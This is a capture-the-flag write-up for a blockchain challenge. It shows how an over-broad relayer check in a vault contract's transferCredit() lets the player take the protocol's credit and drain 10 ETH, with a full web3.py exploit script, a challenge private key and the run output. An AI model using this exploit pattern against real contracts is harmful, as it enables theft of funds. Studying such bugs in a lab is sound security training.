# Phantom Ledger

## Category

Blockchain

## Challenge Description

A DeFi vault named `PhantomVault` supports normal ETH deposits, direct withdrawals, and gasless meta-transaction withdrawals through a trusted relayer. The vault starts with 10 ETH owned by the protocol, and the objective is to drain the vault until `Setup.isSolved()` returns `true`.

## Given Files

- `PhantomVault.sol`
- `Setup.sol`

## Goal

Drain all ETH from the deployed `PhantomVault` contract.

```solidity
function isSolved() external view returns (bool) {
    return address(vault).balance == 0;
}
```

## Initial Analysis

The setup contract deploys the vault like this:

```solidity
constructor(address _player) payable {
    vault = new PhantomVault{value: msg.value}(_player, _player);
}
```

Inside `PhantomVault`, the constructor stores the initial ETH deposit as an internal balance for `msg.sender`:

```solidity
constructor(address _relayer, address _feeRecipient) payable {
    owner = msg.sender;
    relayer = _relayer;
    feeRecipient = _feeRecipient;
    feeRate = 200;
    _locked = 0;

    if (msg.value > 0) {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
}
```

Because the vault is deployed by `Setup`, the initial 10 ETH is credited to the `Setup` contract, not to the player.

So the state becomes:

```
owner              = Setup contract
relayer            = player
feeRecipient       = player
balances[Setup]    = 10 ETH
balances[player]   = 0 ETH
vault ETH balance  = 10 ETH
```

## Vulnerability

The vulnerable function is `transferCredit()`:

```solidity
function transferCredit(address from, address to, uint256 amount) external {
    require(msg.sender == from || msg.sender == relayer, "Not authorized");
    require(balances[from] >= amount, "Insufficient credit");

    balances[from] -= amount;
    balances[to] += amount;

    emit CreditTransfer(from, to, amount);
}
```

The bug is in the authorization check:

```solidity
require(msg.sender == from || msg.sender == relayer, "Not authorized");
```

The relayer is allowed to transfer credit from any address, not only from its own account or from users who signed an approval.

Since the player is set as the relayer in `Setup.sol`, the player can directly move the protocol's internal credit:

```solidity
transferCredit(setup, player, 10 ether)
```

After that, the player has an internal vault balance of 10 ETH and can call the normal `withdraw()` function.

## Exploit Strategy

The exploit only needs two transactions:

1. Move the internal credit from `Setup` to the player:

```solidity
vault.transferCredit(setup, player, 10 ether);
```

2. Withdraw the newly assigned credit:

```solidity
vault.withdraw(10 ether);
```

After the withdrawal, the vault's ETH balance becomes zero and `isSolved()` returns `true`.

## Exploit Script

```python
#!/usr/bin/env python3
from web3 import Web3

RPC_URL = "http://34.2.147.230:8502/2720c901-0a87-4148-9134-d0852a403c83"
PRIVKEY = "0d265796c724db336536c988cb71b16b344f20b8eec5d636387356231dd5455a"
SETUP_CONTRACT_ADDR = "0x404006B5d8C6A05038c1D404b68546A93f7bd888"
PLAYER = "0x7426AE6CcFdd84C1f6565532E6f28597E3C0E9E4"

w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVKEY)

setup_abi = [
    {
        "inputs": [],
        "name": "vault",
        "outputs": [{"internalType": "contract PhantomVault", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

vault_abi = [
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "getBalance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"},
        ],
        "name": "transferCredit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "relayer",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
]


def send_tx(tx):
    tx.update(
        {
            "from": account.address,
            "nonce": w3.eth.get_transaction_count(account.address),
            "chainId": w3.eth.chain_id,
            "gasPrice": w3.eth.gas_price,
        }
    )
    tx["gas"] = w3.eth.estimate_gas(tx)
    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return tx_hash.hex(), receipt


def main():
    setup = w3.eth.contract(address=Web3.to_checksum_address(SETUP_CONTRACT_ADDR), abi=setup_abi)
    vault_addr = setup.functions.vault().call()
    vault = w3.eth.contract(address=vault_addr, abi=vault_abi)

    print(f"[+] player : {account.address}")
    print(f"[+] setup  : {SETUP_CONTRACT_ADDR}")
    print(f"[+] vault  : {vault_addr}")
    print(f"[+] relayer: {vault.functions.relayer().call()}")
    print(f"[+] chainId: {w3.eth.chain_id}")

    vault_eth = w3.eth.get_balance(vault_addr)
    setup_credit = vault.functions.getBalance(SETUP_CONTRACT_ADDR).call()
    player_credit = vault.functions.getBalance(account.address).call()

    print(f"[+] vault ETH balance : {w3.from_wei(vault_eth, 'ether')} ETH")
    print(f"[+] setup credit      : {w3.from_wei(setup_credit, 'ether')} ETH")
    print(f"[+] player credit     : {w3.from_wei(player_credit, 'ether')} ETH")
    print(f"[+] solved before     : {setup.functions.isSolved().call()}")

    amount = setup_credit

    tx_hash, receipt = send_tx(
        vault.functions.transferCredit(
            Web3.to_checksum_address(SETUP_CONTRACT_ADDR),
            Web3.to_checksum_address(account.address),
            amount,
        ).build_transaction()
    )
    print(f"[>] transferCredit(setup -> player) tx: {tx_hash}")
    print(f"[+] transferCredit(setup -> player) ok, gasUsed={receipt.gasUsed}")

    player_credit_after = vault.functions.getBalance(account.address).call()
    print(f"[+] player credit after transfer: {w3.from_wei(player_credit_after, 'ether')} ETH")

    tx_hash, receipt = send_tx(vault.functions.withdraw(player_credit_after).build_transaction())
    print(f"[>] withdraw(player credit) tx: {tx_hash}")
    print(f"[+] withdraw(player credit) ok, gasUsed={receipt.gasUsed}")

    print(f"[+] final vault ETH balance: {w3.from_wei(w3.eth.get_balance(vault_addr), 'ether')} ETH")
    print(f"[+] solved after           : {setup.functions.isSolved().call()}")


if __name__ == "__main__":
    main()
```

## Execution Result

```
[+] player : 0x7426AE6CcFdd84C1f6565532E6f28597E3C0E9E4
[+] setup  : 0x404006B5d8C6A05038c1D404b68546A93f7bd888
[+] vault  : 0x55E1183b8Bc2Be5a3F9F3454eA4E1aaC39Fa91BC
[+] relayer: 0x7426AE6CcFdd84C1f6565532E6f28597E3C0E9E4
[+] chainId: 31337
[+] vault ETH balance : 10 ETH
[+] setup credit      : 10 ETH
[+] player credit     : 0 ETH
[+] solved before     : False
[>] transferCredit(setup -> player) tx: 7f6979d8feabbe1325771bb355a1a5cc7da9ab24c8f484d0708c73c51c26a5e3
[+] transferCredit(setup -> player) ok, gasUsed=50177
[+] player credit after transfer: 10 ETH
[>] withdraw(player credit) tx: 880ff507f7ed94d21cf91344b60d5291e358070aef7f8974bb66187e46364057
[+] withdraw(player credit) ok, gasUsed=46552
[+] final vault ETH balance: 0 ETH
[+] solved after           : True
[+] Phantom Ledger solved
```

## Root Cause

The root cause is broken authorization in `transferCredit()`.

The `relayer` role is supposed to submit signed meta-transactions, but `transferCredit()` gives the relayer direct authority to transfer credit from any account without requiring a signature.

Since the player is initialized as the relayer, the player can steal the internal credit owned by the `Setup` contract and then withdraw the full ETH balance.

## Flag

```
COMPFEST18{ph4nt0m_l3dg3r_cr0ss_funct10n_r33ntr4ncy_w1th_ecdsa_m4ll3ab1l1ty}
```
